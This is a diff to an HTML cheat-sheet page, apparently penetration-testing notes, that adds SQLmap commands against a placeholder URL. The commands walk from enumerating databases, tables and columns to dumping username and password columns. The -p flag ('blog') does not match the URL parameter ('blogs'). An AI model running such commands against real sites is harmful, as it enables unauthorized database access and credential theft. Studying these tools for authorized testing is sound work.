@@ -71,6 +71,12 @@
                     <p><span style="font-size: 24px;"><strong>-a</strong></span></p>
                     <p><span style="font-size: 24px;">Grabs just about everything from the db</span></p>
                     <p><br></p>
+                    <p>SQLmap example:</p>
+<p><strong>Find Databases: sudo sqlmap -u &quot;http://abc.com/abc/?blogs=1&quot; -p blog --dbs (select a DB)</strong></p>
+<p><strong>View DB tables: <strong>sudo sqlmap -u &quot;http://abc.com/abc/?blogs=1&quot; -p blog --dbms=mysql -D abc --tables</strong></strong></p>
+<p><strong><strong>View Columns: <strong>sudo sqlmap -u &quot;http://abc.com/abc/?blogs=1&quot; -p blog --dbms=mysql -D abc -T users --columns</strong></strong></strong></p>
+<p><strong><strong><strong>Dump all:&nbsp;<strong>sudo sqlmap -u &quot;http://abc.com/abc/?blogs=1&quot; -p blog --dbms=mysql -D abc -T users -C username,password --dump</strong></strong></strong></strong></p>
+<p><br></p>
                 </body>
                 
                 </html>
